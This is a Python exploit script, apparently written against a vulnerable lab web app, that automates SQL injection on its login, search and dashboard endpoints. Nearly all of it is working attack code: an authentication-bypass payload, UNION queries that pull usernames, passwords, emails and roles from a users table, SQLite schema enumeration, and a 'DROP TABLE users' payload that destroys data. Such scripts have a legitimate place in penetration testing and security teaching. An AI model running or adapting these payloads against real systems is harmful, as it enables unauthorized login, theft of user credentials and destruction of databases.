#!/usr/bin/env python3

import requests
import sys
import urllib.parse

class SQLInjectionExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_basic_sqli(self):
        print("[+] Testing basic SQL injection...")
        
        payloads = [
            "admin' OR '1'='1' --",
            "admin' OR 1=1 --",
            "' UNION SELECT 1,2,3,4,5 --",
            "'; DROP TABLE users; --"
        ]
        
        for payload in payloads:
            data = {
                'username': payload,
                'password': 'test'
            }
            
            response = self.session.post(f"{self.target_url}/login", data=data, allow_redirects=False)
            
            if response.status_code == 302:
                print(f"[SUCCESS] SQL Injection successful with payload: {payload}")
                return True
            elif "error" in response.text.lower():
                print(f"[INFO] SQL error detected with payload: {payload}")
        
        return False
    
    def extract_database_info(self):
        print("[+] Attempting to extract database information...")
        
        info_payloads = [
            "admin' UNION SELECT sqlite_version(),1,2,3,4 --",
            "admin' UNION SELECT name,sql,3,4,5 FROM sqlite_master WHERE type='table' --",
            "admin' UNION SELECT username,password,email,role,5 FROM users --"
        ]
        
        for payload in info_payloads:
            data = {
                'username': payload,
                'password': 'test'
            }
            
            response = self.session.post(f"{self.target_url}/login", data=data)
            print(f"[INFO] Testing payload: {payload}")
            print(f"Response length: {len(response.text)}")
            
            if len(response.text) > 1000:
                print("[SUCCESS] Potential data extraction detected")
    
    def test_search_sqli(self):
        print("[+] Testing SQL injection in search functionality...")
        
        search_payloads = [
            "test' UNION SELECT username,password,email,role,id FROM users --",
            "test' UNION SELECT 'Extracted:',password,'from',username,id FROM users --"
        ]
        
        for payload in search_payloads:
            params = {'q': payload}
            response = self.session.get(f"{self.target_url}/search", params=params)
            
            if "password" in response.text.lower() or "extracted:" in response.text.lower():
                print(f"[SUCCESS] Data extraction via search: {payload}")
            else:
                print(f"[INFO] Testing search payload: {payload}")
    
    def test_dashboard_sqli(self):
        print("[+] Testing SQL injection in dashboard (IDOR + SQLi)...")
        
        if not self.login_as_admin():
            print("[ERROR] Could not login as admin")
            return
        
        sqli_payloads = [
            "1 UNION SELECT username,password,email,role,id FROM users",
            "1 OR 1=1",
            "999 UNION SELECT 'hacked',password,'extracted',role,username FROM users"
        ]
        
        for payload in sqli_payloads:
            params = {'userId': payload}
            response = self.session.get(f"{self.target_url}/dashboard", params=params)
            
            if len(response.text) > 2000:
                print(f"[SUCCESS] Dashboard SQLi successful: {payload}")
            else:
                print(f"[INFO] Testing dashboard payload: {payload}")
    
    def login_as_admin(self):
        payload = "admin' OR '1'='1' --"
        data = {
            'username': payload,
            'password': 'anything'
        }
        
        response = self.session.post(f"{self.target_url}/login", data=data, allow_redirects=False)
        return response.status_code == 302
    
    def run_all_tests(self):
        print("=" * 60)
        print("SQL INJECTION VULNERABILITY TESTING")
        print("=" * 60)
        
        self.test_basic_sqli()
        print()
        self.extract_database_info()
        print()
        self.test_search_sqli()
        print()
        self.test_dashboard_sqli()
        
        print("\n[INFO] SQL Injection testing completed!")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 sql_injection.py <target_url>")
        print("Example: python3 sql_injection.py http://localhost:3000")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    exploit = SQLInjectionExploit(target_url)
    exploit.run_all_tests()

if __name__ == "__main__":
    main()